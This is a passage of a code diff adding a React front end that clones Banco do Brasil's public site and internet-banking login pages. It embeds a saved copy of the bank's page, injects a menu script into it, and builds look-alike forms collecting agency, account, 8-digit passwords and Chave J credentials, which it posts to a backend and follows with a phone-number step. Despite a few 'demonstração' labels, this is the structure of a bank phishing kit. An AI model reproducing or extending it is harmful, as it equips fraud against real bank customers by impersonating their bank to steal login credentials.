@@ -1,0 +1,1528 @@
+import referenceHtml from '@assets/Pra_Você_｜_Banco_do_Brasil_(03_09_2026_11：42：01)_1788446722154.html?raw';
+import bbCodeReference from '@assets/image_1788450421330.png';
+import pjLoginReference from '@assets/image_1788450344970.png';
+import verificationBackground from '@assets/imgi_2_Conta_Corrente_Conta_Corrente_Consultar_Extrato_Banco_d_1788466962818.png';
+import {
+  ClerkProvider,
+  RedirectToSignIn,
+  SignIn,
+  SignUp,
+  useAuth,
+  useClerk,
+  useUser,
+} from '@clerk/react';
+import { publishableKeyFromHost } from '@clerk/react/internal';
+import { shadcn } from '@clerk/themes';
+import { ArrowLeft, Eye, EyeOff, ContactRound, FileText, List, MessageCircle, ChevronDown, ChevronsRight, CheckCircle2, KeyRound, ShieldAlert } from 'lucide-react';
+import { Redirect, Route, Router as WouterRouter, Switch, useLocation } from 'wouter';
+import { useEffect, useState, type FormEvent, type ReactNode } from 'react';
+import {
+  useConsultarConta,
+  useDefinirSenha,
+  useValidarSenha,
+  useIniciarRecuperacao,
+  useRedefinirSenha,
+} from '@workspace/api-client-react';
+
+const basePath = import.meta.env.BASE_URL.replace(/\/$/, '');
+const clerkPubKey = publishableKeyFromHost(
+  window.location.hostname,
+  import.meta.env.VITE_CLERK_PUBLISHABLE_KEY,
+);
+const clerkProxyUrl = import.meta.env.VITE_CLERK_PROXY_URL;
+
+const formatWithLastDigitSeparator = (value: string) =>
+  value.length > 1 ? `${value.slice(0, -1)}-${value.slice(-1)}` : value;
+
+const PF_SESSION_KEY = 'pf-agencia-conta';
+
+type PfAgencyAccount = {
+  agency: string;
+  account: string;
+};
+
+const readPfSession = (): PfAgencyAccount | null => {
+  try {
+    const raw = window.sessionStorage.getItem(PF_SESSION_KEY);
+    if (!raw) return null;
+    const parsed = JSON.parse(raw) as PfAgencyAccount;
+    if (!parsed.agency || !parsed.account) return null;
+    return parsed;
+  } catch {
+    return null;
+  }
+};
+
+const accountMenuEnhancement = `
+<style>
+  #acesse-sua-conta {
+    position: relative !important;
+  }
+
+  #acesse-sua-conta .clone-account-menu {
+    position: absolute;
+    z-index: 10000;
+    top: calc(100% + 18px);
+    right: 0;
+    width: 300px;
+    overflow: hidden;
+    border-radius: 4px;
+    background: #fff;
+    box-shadow: 0 4px 14px rgba(33, 34, 39, 0.28);
+    color: #212227;
+  }
+
+  #acesse-sua-conta .clone-account-menu[hidden] {
+    display: none;
+  }
+
+  #acesse-sua-conta .clone-account-menu::before {
+    position: absolute;
+    top: -9px;
+    right: 37px;
+    width: 18px;
+    height: 18px;
+    transform: rotate(45deg);
+    background: #fff;
+    content: "";
+  }
+
+  #acesse-sua-conta .clone-account-menu a {
+    position: relative;
+    display: block;
+    min-height: 62px;
+    padding: 19px 24px;
+    border-bottom: 1px solid #d8d8d8;
+    color: #212227;
+    font-family: Arial, sans-serif;
+    font-size: 19px;
+    font-weight: 600;
+    line-height: 1.25;
+    text-decoration: none;
+  }
+
+  #acesse-sua-conta .clone-account-menu a:last-child {
+    border-bottom: 0;
+  }
+
+  #acesse-sua-conta .clone-account-menu a:hover,
+  #acesse-sua-conta .clone-account-menu a:focus-visible {
+    background: #f2f3ff;
+    outline: none;
+  }
+
+  @media (max-width: 767px) {
+    #acesse-sua-conta .clone-account-menu {
+      position: fixed;
+      top: 59px;
+      right: 16px;
+      left: 68px;
+      width: auto;
+    }
+
+    #acesse-sua-conta .clone-account-menu::before {
+      top: -9px;
+      right: 38px;
+    }
+  }
+</style>
+<script>
+  (function () {
+    function installAccountMenu() {
+      var host = document.querySelector("#acesse-sua-conta");
+      var button = host && host.querySelector("button");
+      if (!host || !button || host.dataset.cloneMenuReady) return;
+
+      host.dataset.cloneMenuReady = "true";
+      var menu = document.createElement("div");
+      menu.className = "clone-account-menu";
+      menu.hidden = true;
+      menu.setAttribute("role", "menu");
+      menu.innerHTML =
+        '<a href="${window.location.origin}${basePath}/pessoa-fisica" target="_top" role="menuitem" data-testid="menu-pessoa-fisica">Pessoa Física</a>' +
+        '<a href="${window.location.origin}${basePath}/sign-in" target="_top" role="menuitem" data-testid="menu-pessoa-juridica">Pessoa Jurídica</a>' +
+        '<a href="https://www.bb.com.br/site/setor-publico/" role="menuitem" data-testid="menu-setor-publico">Setor Público</a>' +
+        '<a href="https://www.bb.com.br/site/agronegocios/" role="menuitem" data-testid="menu-produtor-rural">Produtor Rural/ Private</a>';
+      host.appendChild(menu);
+
+      function closeMenu() {
+        menu.hidden = true;
+        button.setAttribute("aria-expanded", "false");
+        host.classList.remove("clone-menu-open");
+      }
+
+      button.addEventListener("click", function (event) {
+        event.preventDefault();
+        event.stopPropagation();
+        var shouldOpen = menu.hidden;
+        if (shouldOpen) {
+          menu.hidden = false;
+          button.setAttribute("aria-expanded", "true");
+          host.classList.add("clone-menu-open");
+        } else {
+          closeMenu();
+        }
+      });
+
+      document.addEventListener("click", function (event) {
+        if (!host.contains(event.target)) closeMenu();
+      });
+
+      document.addEventListener("keydown", function (event) {
+        if (event.key === "Escape") closeMenu();
+      });
+    }
+
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", installAccountMenu);
+    } else {
+      installAccountMenu();
+    }
+  })();
+</script>
+`;
+
+const cloneHtml = referenceHtml.replace('</head>', `${accountMenuEnhancement}</head>`);
+
+const clerkAppearance = {
+  theme: shadcn,
+  options: {
+    logoPlacement: 'inside' as const,
+    logoLinkUrl: basePath || '/',
+    logoImageUrl: `${window.location.origin}${basePath}/logo.svg`,
+  },
+  variables: {
+    colorPrimary: '#465eff',
+    colorForeground: '#212227',
+    colorMutedForeground: '#585b65',
+    colorDanger: '#ba1a1a',
+    colorBackground: '#ffffff',
+    colorInput: '#ffffff',
+    colorInputForeground: '#212227',
+    colorNeutral: '#d8d8d8',
+    fontFamily: 'Arial, sans-serif',
+    borderRadius: '12px',
+  },
+  elements: {
+    rootBox: { width: '100%', display: 'flex', justifyContent: 'center' },
+    cardBox: {
+      width: '440px',
+      maxWidth: '100%',
+      overflow: 'hidden',
+      borderRadius: '20px',
+      backgroundColor: '#ffffff',
+      boxShadow: '0 12px 40px rgba(33, 34, 39, 0.16)',
+    },
+    card: { boxShadow: 'none', border: 'none', backgroundColor: 'transparent' },
+    footer: { boxShadow: 'none', border: 'none', backgroundColor: 'transparent' },
+    headerTitle: { color: '#212227', fontWeight: '700' },
+    headerSubtitle: { color: '#585b65' },
+    socialButtonsBlockButtonText: { color: '#212227' },
+    formFieldLabel: { color: '#212227' },
+    footerActionLink: { color: '#465eff', fontWeight: '700' },
+    footerActionText: { color: '#585b65' },
+    dividerText: { color: '#585b65' },
+    identityPreviewEditButton: { color: '#465eff' },
+    formFieldSuccessText: { color: '#18794e' },
+    alertText: { color: '#ba1a1a' },
+    logoBox: { marginBottom: '8px' },
+    logoImage: { maxHeight: '34px' },
+    socialButtonsBlockButton: {
+      border: '1px solid #d8d8d8',
+      backgroundColor: '#ffffff',
+      color: '#212227',
+    },
+    formButtonPrimary: {
+      backgroundColor: '#465eff',
+      color: '#ffffff',
+      fontWeight: '700',
+    },
+    formFieldInput: {
+      border: '1px solid #b7b9c2',
+      backgroundColor: '#ffffff',
+      color: '#212227',
+    },
+    footerAction: { backgroundColor: 'transparent' },
+    dividerLine: { backgroundColor: '#d8d8d8' },
+    alert: { backgroundColor: '#fff1f1', border: '1px solid #f0b8b8' },
+    otpCodeFieldInput: { border: '1px solid #b7b9c2', color: '#212227' },
+    formFieldRow: { marginBottom: '14px' },
+    main: { padding: '28px' },
+  },
+};
+
+function HomePage() {
+  return (
+    <iframe
+      className="reference-frame"
+      srcDoc={cloneHtml}
+      title="Pra Você | Banco do Brasil"
+      data-testid="reference-page"
+    />
+  );
+}
+
+function HomeRedirect() {
+  const { isLoaded, isSignedIn } = useAuth();
+
+  if (isLoaded && isSignedIn) {
+    return <Redirect to="/user-portal" />;
+  }
+
+  return <HomePage />;
+}
+
+function AutoatendimentoShell({
+  children,
+  loading = false,
+}: {
+  children: ReactNode;
+  loading?: boolean;
+}) {
+  return (
+    <main className="auto-page">
+      <header className="auto-topbar">
+        <a href={basePath || '/'} aria-label="Voltar para a página inicial">
+          <img src={`${basePath}/autoatendimento-logo.svg`} alt="Autoatendimento" />
+        </a>
+      </header>
+
+      <section className="auto-content">{children}</section>
+
+      <nav className="auto-bottom-nav" aria-label="Atalhos do autoatendimento">
+        <button type="button" aria-label="Contatos"><ContactRound size={24} /></button>
+        <button type="button" aria-label="Menu"><List size={24} /></button>
+        <button type="button" aria-label="Documentos"><FileText size={24} /></button>
+      </nav>
+      <button className="auto-chat" type="button" aria-label="Abrir atendimento">
+        <MessageCircle size={23} />
+      </button>
+      {loading && <PjLoadingOverlay />}
+    </main>
+  );
+}
+
+function AutoatendimentoPage() {
+  const [, setLocation] = useLocation();
+  const [agency, setAgency] = useState('');
+  const [account, setAccount] = useState('');
+  const [rememberAccount, setRememberAccount] = useState(false);
+  const [error, setError] = useState('');
+  const [focusedField, setFocusedField] = useState<'agency' | 'account'>('agency');
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    const normalizedAgency = agency.replace(/\D/g, '');
+    const normalizedAccount = account.replace(/\D/g, '');
+
+    if (!normalizedAgency || !normalizedAccount) {
+      setError('Informe a agência e a conta para continuar.');
+      return;
+    }
+
+    window.sessionStorage.setItem(
+      PF_SESSION_KEY,
+      JSON.stringify({ agency: normalizedAgency, account: normalizedAccount }),
+    );
+
+    if (rememberAccount) {
+      window.localStorage.setItem(
+        'conta-pj-agencia-conta',
+        JSON.stringify({ agency: normalizedAgency, account: normalizedAccount }),
+      );
+    }
+
+    setError('');
+    setIsLoading(true);
+  };
+
+  useEffect(() => {
+    if (!isLoading) return;
+
+    const timer = window.setTimeout(() => {
+      setLocation('/pessoa-fisica/senha');
+    }, 2000);
+
+    return () => window.clearTimeout(timer);
+  }, [isLoading, setLocation]);
+
+  return (
+    <AutoatendimentoShell loading={isLoading}>
+      <form className="auto-card" onSubmit={handleSubmit} aria-labelledby="auto-title">
+        <h1 id="auto-title">Agência e conta</h1>
+
+        <label
+          className={`auto-field-label ${focusedField === 'agency' ? 'is-focused' : ''}`}
+          htmlFor="agency"
+        >
+          Agência
+        </label>
+        <input
+          id="agency"
+          inputMode="numeric"
+          autoComplete="off"
+          placeholder="Agência"
+          autoFocus
+          value={formatWithLastDigitSeparator(agency)}
+          onChange={(event) => setAgency(event.target.value.replace(/\D/g, '').slice(0, 5))}
+          maxLength={6}
+          onFocus={() => setFocusedField('agency')}
+          aria-describedby={error ? 'auto-error' : 'agency-help'}
+          aria-invalid={Boolean(error)}
+        />
+        <span id="agency-help" className="auto-field-help">
+          Informe sua agência com o dígito
+        </span>
+
+        <label
+          className={`auto-field-label ${focusedField === 'account' ? 'is-focused' : ''}`}
+          htmlFor="account"
+        >
+          Conta
+        </label>
+        <input
+          id="account"
+          inputMode="numeric"
+          autoComplete="off"
+          placeholder="Conta corrente"
+          value={formatWithLastDigitSeparator(account)}
+          onChange={(event) => setAccount(event.target.value.replace(/\D/g, '').slice(0, 11))}
+          maxLength={12}
+          onFocus={() => setFocusedField('account')}
+          aria-describedby={error ? 'auto-error' : 'account-help'}
+          aria-invalid={Boolean(error)}
+        />
+        <span id="account-help" className="auto-field-help">
+          Informe sua conta com o dígito
+        </span>
+
+        <label className="auto-switch-row">
+          <input
+            type="checkbox"
+            checked={rememberAccount}
+            onChange={(event) => setRememberAccount(event.target.checked)}
+          />
+          <span className="auto-switch" aria-hidden="true" />
+          <span>Guardar agência e conta</span>
+        </label>
+
+        {error && <p className="auto-error" id="auto-error" role="alert">{error}</p>}
+
+        <button className="auto-continue" type="submit">CONTINUAR</button>
+        <button className="auto-other-access" type="button" onClick={() => setLocation('/')}>
+          Outro tipo de acesso
+        </button>
+      </form>
+    </AutoatendimentoShell>
+  );
+}
+
+type SenhaMode = 'loading' | 'definir' | 'validar' | 'bloqueada' | 'recuperar' | 'sucesso';
+type Feedback = { type: 'error' | 'success' | 'info'; text: string } | null;
+
+const onlyDigits = (value: string, max: number) => value.replace(/\D/g, '').slice(0, max);
+
+function AutoatendimentoPasswordPage() {
+  const [, setLocation] = useLocation();
+  const session = readPfSession();
+
+  const [mode, setMode] = useState<SenhaMode>('loading');
+  const [holderName, setHolderName] = useState<string | null>(null);
+  const [feedback, setFeedback] = useState<Feedback>(null);
+
+  const [password, setPassword] = useState('');
+  const [confirmPassword, setConfirmPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+
+  const [recoverStep, setRecoverStep] = useState<'solicitar' | 'confirmar'>('solicitar');
+  const [recoveryCode, setRecoveryCode] = useState('');
+  const [demoCode, setDemoCode] = useState<string | null>(null);
+  const [maskedPhone, setMaskedPhone] = useState<string | null>(null);
+  const [newPassword, setNewPassword] = useState('');
+  const [confirmNewPassword, setConfirmNewPassword] = useState('');
+
+  const consultar = useConsultarConta();
+  const definir = useDefinirSenha();
+  const validar = useValidarSenha();
+  const iniciarRecuperacao = useIniciarRecuperacao();
+  const redefinir = useRedefinirSenha();
+
+  useEffect(() => {
+    if (!session) return;
+    consultar.mutate(
+      { data: { agency: session.agency, account: session.account } },
+      {
+        onSuccess: (data) => {
+          setHolderName(data.holderName ?? null);
+          if (data.locked) setMode('bloqueada');
+          else if (data.hasPassword) setMode('validar');
+          else setMode('definir');
+        },
+        onError: () => setMode('definir'),
+      },
+    );
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  if (!session) {
+    return <Redirect to="/pessoa-fisica" />;
+  }
+
+  const resetFeedback = () => setFeedback(null);
+  const busy =
+    consultar.isPending ||
+    definir.isPending ||
+    validar.isPending ||
+    iniciarRecuperacao.isPending ||
+    redefinir.isPending;
+
+  const handleValidar = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    resetFeedback();
+    validar.mutate(
+      { data: { agency: session.agency, account: session.account, password } },
+      {
+        onSuccess: (data) => {
+          if (data.success) {
+            setHolderName(data.holderName ?? holderName);
+            setFeedback({ type: 'success', text: data.message });
+            setMode('sucesso');
+          } else {
+            setPassword('');
+            if (data.locked) setMode('bloqueada');
+            setFeedback({ type: 'error', text: data.message });
+          }
+        },
+        onError: () =>
+          setFeedback({ type: 'error', text: 'Não foi possível validar agora. Tente novamente.' }),
+      },
+    );
+  };
+
+  const handleDefinir = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    resetFeedback();
+    if (password !== confirmPassword) {
+      setFeedback({ type: 'error', text: 'As senhas não conferem.' });
+      return;
+    }
+    definir.mutate(
+      {
+        data: {
+          agency: session.agency,
+          account: session.account,
+          password,
+          confirmPassword,
+        },
+      },
+      {
+        onSuccess: (data) => {
+          if (data.success) {
+            setHolderName(data.holderName ?? holderName);
+            setFeedback({ type: 'success', text: data.message });
+            setMode('sucesso');
+          } else {
+            setFeedback({ type: 'error', text: data.message });
+            if (data.locked) setMode('bloqueada');
+          }
+        },
+        onError: () =>
+          setFeedback({ type: 'error', text: 'Não foi possível definir a senha agora.' }),
+      },
+    );
+  };
+
+  const openRecuperar = () => {
+    resetFeedback();
+    setMode('recuperar');
+    setRecoverStep('solicitar');
+    setDemoCode(null);
+    setRecoveryCode('');
+    setNewPassword('');
+    setConfirmNewPassword('');
+  };
+
+  const handleSolicitarCodigo = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    resetFeedback();
+    iniciarRecuperacao.mutate(
+      { data: { agency: session.agency, account: session.account } },
+      {
+        onSuccess: (data) => {
+          if (data.success) {
+            setDemoCode(data.recoveryCode ?? null);
+            setMaskedPhone(data.maskedPhone ?? null);
+            setRecoverStep('confirmar');
+            setFeedback({ type: 'info', text: data.message });
+          } else {
+            setFeedback({ type: 'error', text: data.message });
+          }
+        },
+        onError: () =>
+          setFeedback({ type: 'error', text: 'Não foi possível iniciar a recuperação.' }),
+      },
+    );
+  };
+
+  const handleRedefinir = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    resetFeedback();
+    if (newPassword !== confirmNewPassword) {
+      setFeedback({ type: 'error', text: 'As senhas não conferem.' });
+      return;
+    }
+    redefinir.mutate(
+      {
+        data: {
+          agency: session.agency,
+          account: session.account,
+          recoveryCode,
+          newPassword,
+          confirmNewPassword,
+        },
+      },
+      {
+        onSuccess: (data) => {
+          if (data.success) {
+            setHolderName(data.holderName ?? holderName);
+            setFeedback({ type: 'success', text: data.message });
+            setMode('sucesso');
+          } else {
+            setFeedback({ type: 'error', text: data.message });
+          }
+        },
+        onError: () =>
+          setFeedback({ type: 'error', text: 'Não foi possível redefinir a senha.' }),
+      },
+    );
+  };
+
+  const FeedbackMessage = () =>
+    feedback ? (
+      <p className={`auto-feedback auto-feedback--${feedback.type}`} role="alert" data-testid="senha-feedback">
+        {feedback.text}
+      </p>
+    ) : null;
+
+  const summary = (
+    <div className="auto-summary">
+      <div className="auto-summary-col">
+        <span>Agência</span>
+        <strong data-testid="senha-agencia">{formatWithLastDigitSeparator(session.agency)}</strong>
+      </div>
+      <div className="auto-summary-col">
+        <span>Conta</span>
+        <strong data-testid="senha-conta">{formatWithLastDigitSeparator(session.account)}</strong>
+      </div>
+    </div>
+  );
+
+  const passwordField = (
+    id: string,
+    value: string,
+    onChange: (v: string) => void,
+    label: string,
+    testId: string,
+  ) => (
+    <>
+      <label className="auto-field-label" htmlFor={id}>
+        {label}
+      </label>
+      <div className="auto-password-row">
+        <input
+          id={id}
+          type={showPassword ? 'text' : 'password'}
+          inputMode="numeric"
+          autoComplete="off"
+          placeholder="SENHA 8 DÍGITOS"
+          value={value}
+          onChange={(event) => onChange(onlyDigits(event.target.value, 8))}
+          maxLength={8}
+          required
+          data-testid={testId}
+        />
+        <button
+          type="button"
+          className="auto-help-btn"
+          onClick={() => setShowPassword((s) => !s)}
+          aria-label={showPassword ? 'Ocultar senha' : 'Mostrar senha'}
+          data-testid="senha-toggle-visibilidade"
+        >
+          {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
+        </button>
+      </div>
+    </>
+  );
+
+  let content: ReactNode = null;
+
+  if (mode === 'loading') {
+    content = (
+      <div className="auto-card auto-card-senha" data-testid="senha-loading">
+        <h1>Agência e Conta</h1>
+        {summary}
+        <p className="auto-field-help">Consultando sua conta...</p>
+      </div>
+    );
+  } else if (mode === 'sucesso') {
+    content = (
+      <div className="auto-card auto-card-senha auto-success" data-testid="senha-sucesso">
+        <CheckCircle2 size={40} className="auto-success-icon" aria-hidden="true" />
+        <h1>Tudo certo!</h1>
+        {holderName && <p className="auto-success-name">{holderName}</p>}
+        <p className="auto-success-copy">
+          {feedback?.text ?? 'Acesso liberado (ambiente de demonstração).'}
+        </p>
+        <button
+          className="auto-continue"
+          type="button"
+          onClick={() => setLocation('/')}
+          data-testid="senha-sucesso-inicio"
+        >
+          VOLTAR AO INÍCIO
+        </button>
+      </div>
+    );
+  } else if (mode === 'bloqueada') {
+    content = (
+      <div className="auto-card auto-card-senha" data-testid="senha-bloqueada">
+        <ShieldAlert size={36} className="auto-block-icon" aria-hidden="true" />
+        <h1>Conta bloqueada</h1>
+        {summary}
+        <p className="auto-success-copy">
+          Sua conta de demonstração foi bloqueada por tentativas. Recupere sua senha para desbloquear.
+        </p>
+        <button className="auto-continue" type="button" onClick={openRecuperar} data-testid="senha-bloqueada-recuperar">
+          RECUPERAR SENHA
+        </button>
+        <button className="auto-other-access" type="button" onClick={() => setLocation('/pessoa-fisica')}>
+          Outra conta
+        </button>
+      </div>
+    );
+  } else if (mode === 'validar') {
+    content = (
+      <form className="auto-card auto-card-senha" onSubmit={handleValidar} data-testid="senha-form-validar">
+        <h1>Agência e Conta</h1>
+        {summary}
+        {passwordField('pf-password', password, setPassword, 'Senha de 8 dígitos', 'senha-input-validar')}
+        <FeedbackMessage />
+        <button className="auto-continue" type="submit" disabled={password.length !== 8 || busy} data-testid="senha-entrar">
+          {validar.isPending ? 'VALIDANDO...' : 'ENTRAR'}
+        </button>
+        <button className="auto-other-access" type="button" onClick={openRecuperar} data-testid="senha-esqueci">
+          Esqueci minha senha
+        </button>
+        <button className="auto-other-access" type="button" onClick={() => setLocation('/pessoa-fisica')}>
+          Outra conta
+        </button>
+      </form>
+    );
+  } else if (mode === 'definir') {
+    content = (
+      <form className="auto-card auto-card-senha" onSubmit={handleDefinir} data-testid="senha-form-definir">
+        <h1>Criar senha</h1>
+        {summary}
+        <p className="auto-field-help">Primeiro acesso: crie sua senha de 8 dígitos.</p>
+        {passwordField('pf-new-password', password, setPassword, 'Nova senha', 'senha-input-definir')}
+        {passwordField('pf-confirm-password', confirmPassword, setConfirmPassword, 'Confirmar senha', 'senha-input-definir-confirmar')}
+        <FeedbackMessage />
+        <button
+          className="auto-continue"
+          type="submit"
+          disabled={password.length !== 8 || confirmPassword.length !== 8 || busy}
+          data-testid="senha-definir-btn"
+        >
+          {definir.isPending ? 'SALVANDO...' : 'DEFINIR SENHA'}
+        </button>
+        <button className="auto-other-access" type="button" onClick={() => setLocation('/pessoa-fisica')}>
+          Outra conta
+        </button>
+      </form>
+    );
+  } else if (mode === 'recuperar') {
+    content =
+      recoverStep === 'solicitar' ? (
+        <form className="auto-card auto-card-senha" onSubmit={handleSolicitarCodigo} data-testid="senha-form-recuperar">
+          <KeyRound size={32} className="auto-block-icon" aria-hidden="true" />
+          <h1>Recuperar senha</h1>
+          {summary}
+          <p className="auto-field-help">Vamos enviar um código para o telefone cadastrado.</p>
+          <FeedbackMessage />
+          <button className="auto-continue" type="submit" disabled={busy} data-testid="senha-enviar-codigo">
+            {iniciarRecuperacao.isPending ? 'ENVIANDO...' : 'ENVIAR CÓDIGO'}
+          </button>
+          <button
+            className="auto-other-access"
+            type="button"
+            onClick={() => {
+              resetFeedback();
+              setMode(holderName ? 'validar' : 'definir');
+            }}
+          >
+            Voltar
+          </button>
+        </form>
+      ) : (
+        <form className="auto-card auto-card-senha" onSubmit={handleRedefinir} data-testid="senha-form-redefinir">
+          <h1>Redefinir senha</h1>
+          {maskedPhone && (
+            <p className="auto-field-help">Código enviado para {maskedPhone}</p>
+          )}
+          {demoCode && (
+            <div className="auto-demo-code" data-testid="senha-demo-codigo">
+              <span>Código (demonstração)</span>
+              <strong>{demoCode}</strong>
+            </div>
+          )}
+          <label className="auto-field-label" htmlFor="pf-recovery-code">
+            Código de 6 dígitos
+          </label>
+          <input
+            id="pf-recovery-code"
+            inputMode="numeric"
+            autoComplete="off"
+            placeholder="000000"
+            value={recoveryCode}
+            onChange={(event) => setRecoveryCode(onlyDigits(event.target.value, 6))}
+            maxLength={6}
+            required
+            data-testid="senha-input-codigo"
+          />
+          {passwordField('pf-reset-password', newPassword, setNewPassword, 'Nova senha', 'senha-input-nova')}
+          {passwordField('pf-reset-confirm', confirmNewPassword, setConfirmNewPassword, 'Confirmar nova senha', 'senha-input-nova-confirmar')}
+          <FeedbackMessage />
+          <button
+            className="auto-continue"
+            type="submit"
+            disabled={recoveryCode.length !== 6 || newPassword.length !== 8 || confirmNewPassword.length !== 8 || busy}
+            data-testid="senha-redefinir-btn"
+          >
+            {redefinir.isPending ? 'REDEFININDO...' : 'REDEFINIR'}
+          </button>
+          <button className="auto-other-access" type="button" onClick={() => setRecoverStep('solicitar')}>
+            Voltar
+          </button>
+        </form>
+      );
+  }
+
+  return <AutoatendimentoShell loading={consultar.isPending && mode === 'loading'}>{content}</AutoatendimentoShell>;
+}
+
+function PjLoadingOverlay() {
+  return (
+    <div className="pj-loading-overlay" role="status" aria-live="polite">
+      <div className="pj-loading-content">
+        <span className="pj-loading-spinner" aria-hidden="true" />
+        <span>Aguarde</span>
+      </div>
+    </div>
+  );
+}
+
+function PjLoginPage() {
+  const [, setLocation] = useLocation();
+  const [accessType, setAccessType] = useState('Chave J');
+  const [identifier, setIdentifier] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [rememberMe, setRememberMe] = useState(true);
+  const [isLoading, setIsLoading] = useState(false);
+
+  const [profileOpen, setProfileOpen] = useState(false);
+  const [profile, setProfile] = useState('PJ Empresas');
+
+  const isChaveJPrefixValid = identifier.startsWith('J');
+  const isChaveJComplete = isChaveJPrefixValid && identifier.length === 8;
+  const showChaveJError =
+    accessType === 'Chave J' && identifier.length > 0 && !isChaveJPrefixValid;
+
+  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+
+    if (accessType === 'Chave J' && !isChaveJComplete) {
+      return;
+    }
+
+    setIsLoading(true);
+  };
+
+  useEffect(() => {
+    if (!isLoading) return;
+
+    const timer = window.setTimeout(() => {
+      setIsLoading(false);
+      setLocation('/sign-in/celular');
+    }, 1500);
+
+    return () => window.clearTimeout(timer);
+  }, [isLoading, setLocation]);
+
+  const profiles = ['PJ Empresas', 'Setor Público', 'Produtor Rural/Private', 'Não correntista'];
+
+  const handleIdentifierChange = (value: string) => {
+    if (accessType === 'Chave J') {
+      setIdentifier(value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 8));
+      return;
+    }
+
+    setIdentifier(value);
+  };
+
+  return (
+    <main className="pj-login-container">
+      <div className="pj-login-left">
+        <div className="pj-login-left-content">
+          <header className="pj-login-header">
+            <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="pj-login-logo" />
+            <div className="pj-login-title">
+              <h1>Acesse sua conta</h1>
+              <h2>Banco do Brasil</h2>
+            </div>
+          </header>
+
+          <form className="pj-login-form" onSubmit={handleSubmit}>
+            <div className="pj-profile-select-group">
+              <span className="pj-group-label" id="profile-label">Perfil selecionado</span>
+              <div className="pj-profile-dropdown-container">
+                <button 
+                  type="button" 
+                  className={`pj-profile-dropdown ${profileOpen ? 'open' : ''}`} 
+                  onClick={() => setProfileOpen(!profileOpen)}
+                  aria-haspopup="listbox"
+                  aria-expanded={profileOpen}
+                  aria-labelledby="profile-label"
+                >
+                  <span>{profile}</span>
+                  <ChevronDown size={20} className="pj-dropdown-icon" />
+                </button>
+                {profileOpen && (
+                  <ul className="pj-profile-list" role="listbox" aria-labelledby="profile-label">
+                    {profiles.map((p) => (
+                      <li 
+                        key={p} 
+                        role="option" 
+                        aria-selected={profile === p}
+                        onClick={() => {
+                          setProfile(p);
+                          setProfileOpen(false);
+                        }}
+                      >
+                        {p}
+                      </li>
+                    ))}
+                  </ul>
+                )}
+              </div>
+            </div>
+
+            <div className="pj-access-type-group">
+              <span className="pj-group-label">Tipo de acesso</span>
+              <div className="pj-access-pills" role="group" aria-label="Tipo de acesso">
+                {['Chave J', 'CPF', 'BB Code', 'Certificado Digital'].map(type => (
+                  <button
+                    key={type}
+                    type="button"
+                    className={`pj-pill ${accessType === type ? 'active' : ''}`}
+                    onClick={() => {
+                      setAccessType(type);
+                      setIdentifier('');
+                      setPassword('');
+                    }}
+                    aria-pressed={accessType === type}
+                  >
+                    {type}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {(accessType === 'Chave J' || accessType === 'CPF') && (
+              <>
+                <div className="pj-input-group">
+                  <label htmlFor="pj-identifier">{accessType}</label>
+                  <input
+                    id="pj-identifier"
+                    type="text"
+                     className={
+                       accessType === 'Chave J'
+                         ? showChaveJError
+                           ? 'pj-input-error'
+                           : 'pj-input-normal'
+                         : identifier === ''
+                           ? 'pj-input-error'
+                           : 'pj-input-normal'
+                     }
+                    value={identifier}
+                     onChange={e => handleIdentifierChange(e.target.value)}
+                     maxLength={accessType === 'Chave J' ? 8 : undefined}
+                    autoComplete="off"
+                  />
+                   {showChaveJError && (
+                    <span className="pj-error-text">
+                       Chave J inválida
+                    </span>
+                  )}
+                </div>
+
+                <div className="pj-input-group">
+                  <label htmlFor="pj-password">Senha</label>
+                  <div className="pj-password-wrapper">
+                    <input
+                      id="pj-password"
+                      type={showPassword ? 'text' : 'password'}
+                      className="pj-input-normal"
+                      value={password}
+                      onChange={e => setPassword(e.target.value)}
+                      autoComplete="off"
+                     required
+                    />
+                    <button
+                      type="button"
+                      className="pj-password-toggle"
+                      onClick={() => setShowPassword(!showPassword)}
+                      aria-label={showPassword ? 'Ocultar senha' : 'Mostrar senha'}
+                    >
+                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+                    </button>
+                  </div>
+                </div>
+
+                <div className="pj-forgot-password">
+                  <button type="button" onClick={() => setLocation('/secure-login')}>
+                    Esqueci minha senha
+                  </button>
+                </div>
+
+                <div className="pj-remember-group">
+                  <label className="pj-checkbox-label">
+                    <input
+                      type="checkbox"
+                      checked={rememberMe}
+                      onChange={e => setRememberMe(e.target.checked)}
+                    />
+                    <span className="pj-checkbox-custom"></span>
+                    Salvar dados neste computador
+                  </label>
+                </div>
+
+                <button
+                  type="submit"
+                  className="pj-submit-btn"
+                  disabled={showChaveJError}
+                >
+                  ENTRAR
+                </button>
+              </>
+            )}
+
+            {accessType === 'BB Code' && (
+              <div className="pj-bbcode-group">
+                <div className="pj-qr-container">
+                  <img src={bbCodeReference} alt="QR Code" className="pj-qr-image" />
+                </div>
+                <ol className="pj-bbcode-instructions">
+                  <li>Acesse o App BB em seu smartphone e abra o leitor de QR Code (BB Code)</li>
+                  <li>Aponte a câmera para o QR Code exibido acima</li>
+                  <li>Insira suas credenciais e aguarde a liberação de acesso</li>
+                </ol>
+                <div className="pj-bbcode-link">
+                  Primeiro acesso?{' '}
+                  <button type="button">Saiba como habilitar o BB Code</button>
+                </div>
+              </div>
+            )}
+          </form>
+
+          <footer className="pj-login-footer">
+            <p>© Banco do Brasil</p>
+          </footer>
+        </div>
+        
+        <button type="button" className="pj-chat-btn" aria-label="Abrir chat">
+          <MessageCircle size={22} />
+        </button>
+      </div>
+
